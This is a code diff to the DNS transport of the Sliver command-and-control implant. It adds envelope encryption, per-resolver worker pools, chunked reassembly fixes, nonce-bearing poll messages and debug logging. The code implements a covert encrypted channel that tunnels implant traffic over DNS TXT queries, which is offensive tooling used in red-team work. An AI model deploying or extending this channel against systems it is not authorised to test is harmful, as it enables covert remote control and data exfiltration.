@@ -144,9 +144,10 @@ type SliverDNSClient struct {
 	queue      chan *DNSWork
 	workerPool []*DNSWorker
 
-	base32       encoders.Base32
-	enableBase58 bool
-	base58       encoders.Base58
+	base32 encoders.Base32
+	base58 encoders.Base58
+
+	enableCaseSensitiveEncoder bool
 }
 
 // DNSWork - Single unit of work for DNSWorker
@@ -292,14 +293,19 @@ func (s *SliverDNSClient) SessionInit() error {
 	log.Printf("[dns] starting worker(s) ...")
 	// {{end}}
 	s.queue = make(chan *DNSWork, queueBufSize)
-	for id, resolver := range s.resolvers {
-		worker := &DNSWorker{
-			resolver: resolver,
-			Metadata: s.metadata[resolver.Address()],
+
+	// Workers per-resolver
+	for i := 0; i < 2; i++ {
+		for id, resolver := range s.resolvers {
+			worker := &DNSWorker{
+				resolver: resolver,
+				Metadata: s.metadata[resolver.Address()],
+			}
+			s.workerPool = append(s.workerPool, worker)
+			worker.Start(id, s.queue)
 		}
-		s.workerPool = append(s.workerPool, worker)
-		worker.Start(id, s.queue)
 	}
+
 	s.closed = false
 	return nil
 }
@@ -338,8 +344,11 @@ func (s *SliverDNSClient) WriteEnvelope(envelope *pb.Envelope) error {
 	if err != nil {
 		return err
 	}
-
-	return s.parallelSend(envelopeData)
+	ciphertext, err := s.cipherCtx.Encrypt(envelopeData)
+	if err != nil {
+		return err
+	}
+	return s.parallelSend(ciphertext)
 }
 
 // ReadEnvelope - Recv an envelope from the server
@@ -360,6 +369,9 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 	if err != nil {
 		return nil, err
 	}
+	// {{if .Config.Debug}}
+	log.Printf("[dns] poll msg domain: %v", domain)
+	// {{end}}
 	respData, _, err := resolver.TXT(domain)
 	if err != nil {
 		return nil, err
@@ -376,10 +388,17 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 	if dnsMsg.Type != dnspb.DNSMessageType_MANIFEST {
 		return nil, ErrInvalidResponse
 	}
-	envelope, err := s.parallelRecv(dnsMsg)
+	ciphertext, err := s.parallelRecv(dnsMsg)
 	if err != nil {
 		return nil, err
 	}
+
+	plaintext, err := s.cipherCtx.Decrypt(ciphertext)
+	if err != nil {
+		return nil, err
+	}
+	envelope := &pb.Envelope{}
+	err = proto.Unmarshal(plaintext, envelope)
 	return envelope, err
 }
 
@@ -393,7 +412,7 @@ func (s *SliverDNSClient) Close() error {
 // parallelSend - send a full message to teh server
 func (s *SliverDNSClient) parallelSend(data []byte) error {
 	var encoder encoders.Encoder
-	if s.enableBase58 {
+	if s.enableCaseSensitiveEncoder {
 		encoder = s.base58
 	} else {
 		encoder = s.base32
@@ -401,7 +420,9 @@ func (s *SliverDNSClient) parallelSend(data []byte) error {
 	msg := &dnspb.DNSMessage{
 		Type: dnspb.DNSMessageType_DATA_FROM_IMPLANT,
 		ID:   s.nextMsgID(),
+		Size: uint32(len(data)),
 	}
+
 	domains, err := s.SplitBuffer(msg, encoder, data)
 	if err != nil {
 		return err
@@ -421,7 +442,7 @@ func (s *SliverDNSClient) parallelSend(data []byte) error {
 	return nil
 }
 
-func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) (*pb.Envelope, error) {
+func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, error) {
 	if manifest.Type != dnspb.DNSMessageType_MANIFEST {
 		return nil, ErrInvalidResponse
 	}
@@ -430,18 +451,18 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) (*pb.Envelope
 
 	wg := &sync.WaitGroup{}
 	results := make(chan *DNSResult, int(manifest.Size/bytesPerTxt)+1)
-	for index := uint32(0); index < manifest.Size; index += bytesPerTxt {
-		if manifest.Size < index {
-			index = manifest.Size
+	for start := uint32(0); start < manifest.Size; start += bytesPerTxt {
+		stop := start + bytesPerTxt
+		if manifest.Size < stop {
+			stop = manifest.Size
 		}
-		stop := index + bytesPerTxt
-		if manifest.Size < index {
-			index = stop
-		}
+		// {{if .Config.Debug}}
+		log.Printf("[dns] parallel read (%d): %d -> %d of %d", manifest.ID, start, stop, manifest.Size)
+		// {{end}}
 		recvMsg, _ := proto.Marshal(&dnspb.DNSMessage{
 			ID:    manifest.ID,
 			Type:  dnspb.DNSMessageType_DATA_TO_IMPLANT,
-			Start: index,
+			Start: start,
 			Stop:  stop,
 		})
 		// This message will always fit in base32
@@ -459,37 +480,64 @@ func (s *SliverDNSClient) parallelRecv(manifest *dnspb.DNSMessage) (*pb.Envelope
 		}
 	}
 
-	recvDataBuf := make([]byte, 0, manifest.Size)
+	// {{if .Config.Debug}}
+	log.Printf("[dns] collecting read results ...")
+	// {{end}}
+
+	recvData := make(chan []byte)
 	errors := []error{}
 	go func() {
+		recvDataBuf := make([]byte, manifest.Size)
 		for result := range results {
 			if result.Err != nil {
 				errors = append(errors, result.Err)
 				continue
 			}
+			// {{if .Config.Debug}}
+			log.Printf("[dns] read result data: %v", result.Data)
+			// {{end}}
 			recvMsg := &dnspb.DNSMessage{}
 			err := proto.Unmarshal(result.Data, recvMsg)
 			if err != nil {
 				errors = append(errors, result.Err)
 				continue
 			}
+			// {{if .Config.Debug}}
+			log.Printf("[dns] recv msg: %v", recvMsg)
+			// {{end}}
 			if manifest.Size < recvMsg.Start || int(manifest.Size) < int(recvMsg.Start)+len(recvMsg.Data) {
 				errors = append(errors, ErrInvalidIndex)
 				continue
 			}
 			copy(recvDataBuf[recvMsg.Start:], recvMsg.Data)
 		}
+		// {{if .Config.Debug}}
+		log.Printf("[dns] all data collected: %v", recvDataBuf)
+		// {{end}}
+		recvData <- recvDataBuf
 	}()
+
+	// {{if .Config.Debug}}
+	log.Printf("[dns] waiting for workers ...")
+	// {{end}}
 	wg.Wait() // All results are in the channel
+
+	// {{if .Config.Debug}}
+	log.Printf("[dns] workers completed, close results channel ...")
+	// {{end}}
 	close(results)
 
-	plaintext, err := s.cipherCtx.Decrypt(recvDataBuf)
-	if err != nil {
-		return nil, err
+	if 0 < len(errors) {
+		// {{if .Config.Debug}}
+		log.Printf("[dns] read errors: %v", errors)
+		// {{end}}
+		return nil, errors[0]
 	}
-	envelope := &pb.Envelope{}
-	err = proto.Unmarshal(plaintext, envelope)
-	return envelope, err
+
+	// {{if .Config.Debug}}
+	log.Printf("[dns] collecting recvData ...")
+	// {{end}}
+	return <-recvData, nil
 }
 
 // SplitBuffer - There's probably a fancy way to calculate this with math and shit but it's much easier to just encode bytes
@@ -607,10 +655,14 @@ func (s *SliverDNSClient) joinSubdataToParent(subdata string) (string, error) {
 }
 
 func (s *SliverDNSClient) pollMsg(meta *ResolverMetadata) (string, error) {
+	nonceBuf := make([]byte, 8)
+	rand.Read(nonceBuf)
 	pollMsg, _ := proto.Marshal(&dnspb.DNSMessage{
+		ID:   s.dnsSessionID,
 		Type: dnspb.DNSMessageType_POLL,
+		Data: nonceBuf,
 	})
-	if s.enableBase58 {
+	if s.enableCaseSensitiveEncoder {
 		return string(s.base58.Encode(pollMsg)), nil
 	} else {
 		return string(s.base32.Encode(pollMsg)), nil
@@ -681,7 +733,7 @@ func (s *SliverDNSClient) fingerprintResolvers() {
 		workingResolvers = append(workingResolvers, resolver)
 	}
 	if allSupportBase58 && !s.forceBase32 {
-		s.enableBase58 = true
+		s.enableCaseSensitiveEncoder = true
 	}
 	s.resolvers = workingResolvers
 }
